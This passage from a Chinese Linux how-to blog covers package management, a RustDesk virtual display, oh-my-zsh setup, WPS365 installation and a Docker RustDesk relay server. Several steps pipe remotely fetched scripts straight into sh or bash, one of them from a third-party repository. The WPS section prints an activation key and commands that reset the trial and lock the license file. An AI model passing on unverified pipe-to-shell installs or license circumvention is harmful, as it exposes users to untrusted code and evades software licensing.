    <content><![CDATA[<h3 id="安装软件的方法"><a href="#安装软件的方法" class="headerlink" title="安装软件的方法"></a>安装软件的方法</h3><h4 id="1-使用dpkg命令"><a href="#1-使用dpkg命令" class="headerlink" title="1. 使用dpkg命令"></a>1. 使用dpkg命令</h4><p><code>dpkg</code>是Debian包管理工具，用于安装、构建、删除和管理Debian软件包，但不自动处理依赖关系。</p>
<ul>
<li><p>打开终端。</p>
</li>
<li><p>转到<code>.deb</code>文件所在的目录。</p>
</li>
<li><p>运行以下命令来安装包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -i package_name.deb</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果安装中出现缺少依赖的错误，可以通过运行以下命令来安装它们：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -f</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-使用APT命令"><a href="#2-使用APT命令" class="headerlink" title="2. 使用APT命令"></a>2. 使用APT命令</h4><p>从APT 1.1版本开始，<code>apt</code>直接支持安装本地的<code>.deb</code>文件，同时自动处理依赖问题。</p>
<ul>
<li><p>打开终端。</p>
</li>
<li><p>使用apt命令安装.deb文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install ./package_name.deb</span><br></pre></td></tr></table></figure>

<p>确保在文件名前加上<code>./</code>，这表明该文件位于当前目录。</p>
</li>
</ul>
<p>这些是在Linux上安装<code>.deb</code>包的几种常用方法，你可以根据自己的需求和环境选择最合适的方法。</p>
<h3 id="卸载软件的方法"><a href="#卸载软件的方法" class="headerlink" title="卸载软件的方法"></a>卸载软件的方法</h3><p><strong>在Ubuntu上卸载软件</strong>可以通过几种不同的方法进行，具体取决于你的偏好和你如何安装这个软件。这里介绍几种常用的方法：</p>
<h4 id="1-使用APT命令卸载软件"><a href="#1-使用APT命令卸载软件" class="headerlink" title="1. 使用APT命令卸载软件"></a>1. 使用APT命令卸载软件</h4><p>如果你是通过APT（Ubuntu的包管理工具）安装的软件，你可以使用以下命令来卸载它：</p>
<ul>
<li><p>打开终端。</p>
</li>
<li><p>运行以下命令以卸载软件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove package_name</span><br></pre></td></tr></table></figure>

<p>这个命令将卸载软件，但通常会保留配置文件。</p>
<p>如果你不确定软件的具体包名，可以使用<strong>apt list –installed</strong>命令来查看所有已安装的软件包名。可以用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed | grep &lt;软件关键词&gt;</span><br></pre></td></tr></table></figure>

<p>来快速查找定位相关软件包；</p>
</li>
<li><p>如果你想彻底删除软件包并清除其配置文件，可以使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt purge package_name</span><br></pre></td></tr></table></figure>
</li>
<li><p>要清理系统中不再需要的依赖包，可以执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt autoremove</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-使用图形界面工具（如Ubuntu-Software-Center）"><a href="#2-使用图形界面工具（如Ubuntu-Software-Center）" class="headerlink" title="2. 使用图形界面工具（如Ubuntu Software Center）"></a>2. 使用图形界面工具（如Ubuntu Software Center）</h4><p>可以通过Ubuntu自带的软件中心进行软件的卸载：</p>
<ul>
<li>打开“Ubuntu Software Center”。</li>
<li>点击“已安装”标签页。</li>
<li>搜索或找到你想要卸载的软件。</li>
<li>点击该软件条目，然后点击“卸载”。</li>
</ul>
<hr>
<p>常用Ubuntu命令</p>
<table>
<thead>
<tr>
<th align="center">操作</th>
<th align="center">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">解压缩</td>
<td align="center">tar -zxvf &lt;softwarename.tar.gz&gt;</td>
</tr>
</tbody></table>
<h3 id="查看软件安装目录"><a href="#查看软件安装目录" class="headerlink" title="查看软件安装目录"></a>查看软件安装目录</h3><h4 id="1-whereis-命令："><a href="#1-whereis-命令：" class="headerlink" title="1. whereis 命令："></a>1. <strong>whereis 命令</strong>：</h4><p><code>whereis</code> 命令可以用来查找二进制文件、源代码文件和手册页的路径。这个命令对于快速查找程序的二进制执行文件、源代码和手册页非常有用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whereis 程序名称</span><br></pre></td></tr></table></figure>

<p>比如，要查找 <code>vim</code> 的相关文件，可以运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whereis vim</span><br></pre></td></tr></table></figure>

<h4 id="2-which-命令："><a href="#2-which-命令：" class="headerlink" title="2. which 命令："></a>2. <strong>which 命令</strong>：</h4><p><code>which</code> 命令通常用来查找某个特定命令的执行文件（二进制文件）的完整路径，这个命令<strong>只返回可执行文件的路径</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> 程序名称</span><br></pre></td></tr></table></figure>

<p>例如，查找 <code>vim</code> 的二进制文件位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> vim</span><br></pre></td></tr></table></figure>

<p>这两个命令对于快速确定程序的位置很有帮助，特别是当你知道程序名但不确定它的安装细节时。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>windows连接ubuntu黑屏,使用rustdesk显示no displays没有显示器</title>
    <url>/posts/7d17509c/</url>
    <content><![CDATA[<h3 id="解决办法安装虚拟显示器"><a href="#解决办法安装虚拟显示器" class="headerlink" title="解决办法安装虚拟显示器"></a>解决办法安装虚拟显示器</h3><h3 id="安装xorg虚拟显示器"><a href="#安装xorg虚拟显示器" class="headerlink" title="安装xorg虚拟显示器"></a>安装xorg虚拟显示器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install xserver-xorg-video-dummy</span><br><span class="line"><span class="comment"># 提示错误依赖使用下面这个试试</span></span><br><span class="line">apt install xserver-xorg-video-dummy  --fix-missing</span><br></pre></td></tr></table></figure>

<h3 id="配置虚拟显示器"><a href="#配置虚拟显示器" class="headerlink" title="配置虚拟显示器"></a>配置虚拟显示器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/X11/xorg.conf</span><br><span class="line"><span class="comment"># 内容如下:</span></span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Device&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    Driver      <span class="string">&quot;dummy&quot;</span></span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Monitor&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    HorizSync 31.5-48.5</span><br><span class="line">    VertRefresh 50-70</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Screen&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Default Screen&quot;</span></span><br><span class="line">    Monitor     <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    Device      <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    DefaultDepth 24</span><br><span class="line">    SubSection <span class="string">&quot;Display&quot;</span></span><br><span class="line">        Depth 24</span><br><span class="line">        Modes <span class="string">&quot;1920x1080&quot;</span></span><br><span class="line">    EndSubSection</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样也填入以上内容到以下文件 </span></span><br><span class="line">vim /usr/share/doc/xserver-xorg-video-intel/xorg.conf</span><br></pre></td></tr></table></figure>

<h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h3 id="连接远程不再提示-没有显示器或黑屏-但是正常插入显示器-不能正常显示"><a href="#连接远程不再提示-没有显示器或黑屏-但是正常插入显示器-不能正常显示" class="headerlink" title="连接远程不再提示 没有显示器或黑屏 但是正常插入显示器 不能正常显示"></a>连接远程不再提示 没有显示器或黑屏 但是正常插入显示器 不能正常显示</h3><h5 id="解决办法-移除刚才的连个配置文件"><a href="#解决办法-移除刚才的连个配置文件" class="headerlink" title="解决办法:移除刚才的连个配置文件"></a>解决办法:移除刚才的连个配置文件</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /usr/share/doc/xserver-xorg-video-intel/xorg.conf ~</span><br><span class="line"><span class="built_in">mv</span> /etc/X11/xorg.conf ~</span><br></pre></td></tr></table></figure>

<h3 id="恢复正常"><a href="#恢复正常" class="headerlink" title="恢复正常"></a>恢复正常</h3><h5 id="使用虚拟显示器的时候-再把文件移动到原来位置"><a href="#使用虚拟显示器的时候-再把文件移动到原来位置" class="headerlink" title="使用虚拟显示器的时候 再把文件移动到原来位置"></a>使用虚拟显示器的时候 再把文件移动到原来位置</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/cc/xorg.conf /usr/share/doc/xserver-xorg-video-intel/xorg.conf</span><br><span class="line"><span class="built_in">mv</span> /home/cc/xorg.conf /etc/X11/xorg.conf </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu默认从bash转成zsh的方法和安装插件</title>
    <url>/posts/f0c8bdaf/</url>
    <content><![CDATA[<h2 id="一、安装oh-my-zsh"><a href="#一、安装oh-my-zsh" class="headerlink" title="一、安装oh-my-zsh"></a>一、安装oh-my-zsh</h2><ul>
<li><p>此版本已经自带了 zsh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># /bin/zsh</span></span><br><span class="line"><span class="comment"># 如果没有，执行指令安装</span></span><br><span class="line">apt install zsh</span><br></pre></td></tr></table></figure>
</li>
<li><p>将zsh设置为默认终端，退出shell，重开终端，如果设置不生效，重启系统即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span>	<span class="comment"># 查看当前终端,默认是bash</span></span><br><span class="line">chsh -s /bin/zsh <span class="comment"># 设置默认终端为zsh</span></span><br><span class="line">chsh -s /bin/bash <span class="comment"># 切换回bash终端</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装zsh完成后，进入官网：<a href="https://ohmyz.sh/#install%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85">https://ohmyz.sh/#install，使用命令进行安装</a> <code>oh-my-zsh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl 方式</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或 wget 方式</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>注意：由于“不知名原因”，可能出现无法下载情况，如：<code>installer: Failed to connect to github: Connection refused</code>，此处可从github上寻找解决方法。</strong></p>
<ul>
<li>操作地址： <a href="https://github.com/ohmyzsh/ohmyzsh/issues/9465">https://github.com/ohmyzsh/ohmyzsh/issues/9465</a></li>
<li>将<strong>域名和ip</strong>（网址：<a href="https://www.ipaddress.com/">https://www.ipaddress.com/ </a>）对应关系写入 <code>/etc/hosts</code> 文件，执行命令安装，如下：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/hosts /etc/hosts.bak <span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;140.82.113.3 github.com&quot;</span>&gt;&gt;/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;185.199.110.133 raw.githubusercontent.com&quot;</span>&gt;&gt;/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh </span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>退出shell，重开终端，如果设置不生效，重启系统即可。</p>
</li>
</ul>
<h2 id="二、安装自动补全插件和高亮插件"><a href="#二、安装自动补全插件和高亮插件" class="headerlink" title="二、安装自动补全插件和高亮插件"></a>二、安装自动补全插件和高亮插件</h2><ul>
<li><p>参考链接： <a href="https://www.jianshu.com/p/9c8c4886281f">https://www.jianshu.com/p/9c8c4886281f</a>.</p>
</li>
<li><p>自动补全插件下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$ZSH</span>/custom/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>高亮插件下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$ZSH</span>/custom/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 <code>~/.zshrc</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 plugins=(git)</span></span><br><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line"><span class="comment"># 使配置生效，执行</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>退出shell，重开终端，如果设置不生效，重启系统即可。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux版wps365下载安装激活</title>
    <url>/posts/441fb385/</url>
    <content><![CDATA[<h1 id="linux-wps"><a href="#linux-wps" class="headerlink" title="linux-wps"></a>linux-wps</h1><p>Linux 打包 安装 WPS365 (wps-office_12.8.2.17001)</p>
<h1 id="已测试"><a href="#已测试" class="headerlink" title="已测试"></a>已测试</h1><ul>
<li>ubuntu 22.04</li>
<li>ubuntu 24.04</li>
</ul>
<h1 id="一键安装"><a href="#一键安装" class="headerlink" title="一键安装"></a>一键安装</h1><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/atopx/linux-wps/master/install.sh | bash</span><br></pre></td></tr></table></figure>

<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/atopx/linux-wps/master/install.sh | bash</span><br></pre></td></tr></table></figure>

<h3 id="重置试用期"><a href="#重置试用期" class="headerlink" title="重置试用期"></a>重置试用期</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$HOME</span>/.config/Kingsoft <span class="variable">$HOME</span>/.local/share/Kingsoft</span><br></pre></td></tr></table></figure>

<h3 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">694BF-YUDBG-EAR69-BPRGB-ATQXH</span><br><span class="line"><span class="comment"># 使用后执行</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 444 /opt/kingsoft/.auth/license2.dat</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建rustdesk id中继服务器</title>
    <url>/posts/8832024/</url>
    <content><![CDATA[<h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><p>创建一下安装的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>

<p><code>docker-compose.yml</code>填入以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rustdesk-net:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">hbbs:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbs</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21115</span><span class="string">:21115</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116/udp</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21118</span><span class="string">:21118</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbs</span> <span class="string">-r</span> <span class="string">hbbs.example.com:21117</span>   <span class="comment"># hbbs.example.com改成自己的服务器ip或者域名</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbs:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">hbbr:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21117</span><span class="string">:21117</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21119</span><span class="string">:21119</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbr:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<p>没问题的话，<code>ctrl+x</code>退出，按<code>y</code>保存，<code>enter</code>确认。</p>
<p>打开防火墙的端口<code>21115</code>、<code>21116</code>、<code>21117</code>、<code>21118</code>、<code>21119</code></p>
<blockquote>
<p>默认情况下，hbbs 监听<code>21115(tcp)</code>, <code>21116(tcp/udp)</code>, <code>21118(tcp)</code>，hbbr 监听<code>21117(tcp)</code>, <code>21119(tcp)</code>。</p>
<p>务必在防火墙开启这几个端口， **请注意<code>21116</code>同时要开启<code>TCP</code>和<code>UDP</code>**。</p>
<p>其中<code>21115</code>是hbbs用作NAT类型测试，<code>21116/UDP</code>是hbbs用作ID注册与心跳服务，<code>21116/TCP</code>是hbbs用作TCP打洞与连接服务，<code>21117</code>是hbbr用作中继服务, <code>21118</code>和<code>21119</code>是为了支持网页客户端。</p>
<p>如果您不需要网页客户端<code>（21118，21119）</code>支持，对应端口可以不开。</p>
</blockquote>
<ul>
<li>TCP(<strong>21115, 21116, 21117, 21118, 21119</strong>)</li>
<li>UDP(<strong>21116</strong>)</li>
</ul>
<p><a href="https://img.laoda.de/i/2022/06/30/zlio5h-2.webp"><img src="/img/rustdesk/1.webp" alt="image-20220630215240864"></a><br><a href="https://img.laoda.de/i/2022/06/30/10h3dqt-2.webp"><img src="/img/rustdesk/2.webp" alt="image-20220630220546335"></a><br><a href="https://img.laoda.de/i/2022/06/30/zkvklo-2.webp"><img src="/img/rustdesk/3.webp" alt="image-20220630215134217"></a><br><a href="https://img.laoda.de/i/2022/06/30/10hlio9-2.webp"><img src="/img/rustdesk/4.webp" alt="image-20220630220629996"></a></p>
<p>查看端口是否被占用（以<code>21115</code>为例），输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i:21115  <span class="comment">#查看21115端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure>

<p>如果出现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装lsof</span></span><br></pre></td></tr></table></figure>

<p>如果端口没有被占用，我们接着可以运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line">docker-compose up -d  </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
<p>1、不知道服务器IP，可以直接在命令行输入：<code>curl ip.sb</code>，会显示当前服务器的IP。</p>
<p>2、遇到访问不了的情况，请在宝塔面板的防火墙和服务商的后台防火墙里打开对应端口。</p>
</blockquote>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/rustdesk /root/data/docker_data/rustdesk.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose pull    <span class="comment"># 拉取最新的镜像</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d   <span class="comment"># 重新更新当前镜像</span></span><br></pre></td></tr></table></figure>

<p>利用Docker-compose搭建的应用，更新非常容易～</p>
<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose down    <span class="comment"># 停止容器，此时不会删除映射到本地的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/rustdesk  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure>

<h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><h3 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h3><p>见咕咕鸽的视频</p>
<p>点击 ID 右侧的菜单按钮如下，选择“ ID&#x2F;中继服务器”。</p>
<p><a href="https://img.laoda.de/i/2022/06/30/10vdndr-2.webp"><img src="/img/rustdesk/5.webp" alt="img"></a></p>
<p>在 ID 服务器输入框中（被控端+主控端）输入 hbbs 主机或 ip 地址，另外两个地址可以不填，<a href="https://iwanlab.com/tag/rustdesk/">RustDesk</a>会自动推导（如果没有特别设定），中继服务器指的是hbbr（21116）端口。</p>
<p>例如:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hbbs.example.com</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hbbs.example.com:21116</span><br></pre></td></tr></table></figure>

<p><a href="https://img.laoda.de/i/2022/06/30/10werrl-2.webp"><img src="/img/rustdesk/6.webp" alt="img"></a><br><a href="https://img.laoda.de/i/2022/06/30/126s6aa-2.webp"><img src="/img/rustdesk/7.webp" alt="image-20220630230905895"></a><br><a href="https://img.laoda.de/i/2022/06/30/127cdzg-2.webp"><img src="/img/rustdesk/8.webp" alt="image-20220630231000711"></a><br><a href="https://img.laoda.de/i/2022/06/30/12b7cbz-2.webp"><img src="/img/rustdesk/9.webp" alt="image-20220630231648227"></a><br><a href="https://img.laoda.de/i/2022/06/30/128m0xb-2.webp"><img src="/img/rustdesk/10.webp" alt="image-20220630231211642"></a></p>
<h4 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h4><p><a href="https://img.laoda.de/i/2022/06/30/12awwj1-2.webp"><img src="/img/rustdesk/11.webp" alt="image-20220630231557544"></a><br><a href="https://img.laoda.de/i/2022/06/30/12bpj3z-2.webp"><img src="/img/rustdesk/12.webp" alt="image-20220630231732435"></a><br><a href="https://img.laoda.de/i/2022/06/30/12c44fx-2.webp"><img src="/img/rustdesk/13.webp" alt="image-20220630231801433"></a></p>
<h4 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h4><p><a href="https://img.laoda.de/i/2022/06/30/12crxpe-2.webp"><img src="/img/rustdesk/18.webp" alt="image-20220630231912131"></a><br><a href="https://img.laoda.de/i/2022/06/30/12dih3s-2.webp"><img src="/img/rustdesk/14.webp" alt="image-20220630232034319"></a></p>
<h3 id="几个小问题"><a href="#几个小问题" class="headerlink" title="几个小问题"></a>几个小问题</h3><h4 id="加密通话"><a href="#加密通话" class="headerlink" title="加密通话"></a>加密通话</h4><p>最新版必须过设置Key，来加密通话。</p>
<p>以下来自<a href="https://rustdesk.com/docs/zh-cn/self-host/install/">官方文档</a>：</p>
<p>hbbs在第一次运行时，会自动产生一对加密私钥和公钥（分别位于运行目录下的<code>id_ed25519</code>和<code>id_ed25519.pub</code>文件中），其主要用途是为了通讯加密。</p>
<p><a href="https://img.laoda.de/i/2022/06/30/111dylz-2.webp"><img src="/img/rustdesk/15.webp" alt="image-20220630223952511"></a></p>
<p>如果您在上一步骤中没有填写<code>Key:</code>(公钥文件<code>id_ed25519.pub</code>中的内容)，会影响连接，且无法加密。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/data/docker_data/rustdesk/hbbs/id_ed25519.pub</span><br></pre></td></tr></table></figure>

<p><a href="https://img.laoda.de/i/2022/06/30/111y9hm-2.webp"><img src="/img/rustdesk/16.webp" alt="image-20220630224047960"></a></p>
<p>如果您禁止没有key的用户建立非加密连接，请在运行hbbs和hbbr的时候添加<code>-k _ </code>参数，例如:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rustdesk-net:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">hbbs:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbs</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21115</span><span class="string">:21115</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116/udp</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21118</span><span class="string">:21118</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbs</span> <span class="string">-r</span> <span class="string">hbbs.example.com:21117</span> <span class="string">-k</span> <span class="string">_</span>     <span class="comment"># 加上-k _ </span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbs:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span 